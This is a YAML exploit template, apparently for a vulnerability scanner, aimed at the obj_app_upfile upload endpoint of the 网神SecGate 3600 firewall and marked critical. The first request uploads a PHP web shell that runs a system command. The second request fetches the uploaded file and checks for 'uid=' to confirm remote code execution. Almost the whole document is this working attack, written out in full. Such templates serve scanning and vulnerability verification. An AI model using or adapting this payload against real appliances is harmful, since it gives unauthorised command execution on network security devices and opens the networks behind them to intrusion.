id: 网神SecGate 3600 obj_app_upfile
info:
  name: 网神SecGate 3600 obj_app_upfile
  author: 小黑子
  severity: critical
  verified: true
  description: |
    fid="1Lh1LHi6yfkhiO83I59AYg=="

rules:
    r0:
        request:
            method: POST
            path: /?g=obj_app_upfile;
            headers:
             Content-Type:
              multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
             User-Agent:
              Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
            body: "\
              ------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\n\
              Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\
              \r\n\
              10000000\r\n\
              ------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\n\
              Content-Disposition: form-data; name=\"upfile\"; filename=\"qaxvul.php\"\r\n\
              Content-Type: text/plain\r\n\
              \r\n\
              <?php system(\"id\")?>\r\n\
              \r\n\
              \r\n\
              ------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\n\
              Content-Disposition: form-data; name=\"submit_post\"\r\n\
              \r\n\
              obj_app_upfile\r\n\
              ------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\n\
              Content-Disposition: form-data; name=\"__hash__\"\r\n\
              \r\n\
              0b9d6b1ab7479ab69d9f71b05e0e9445\r\n\
              ------WebKitFormBoundaryJpMyThWnAxbcBBQc--\r\n\
              "
        matcher:

    r1:
      request:
        method: GET
        cookie:
        headers:
          User-Agent:
            Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)
        path: /attachements/qaxvul.php
        matcher: res.status_code==200 and "uid=" in res.text
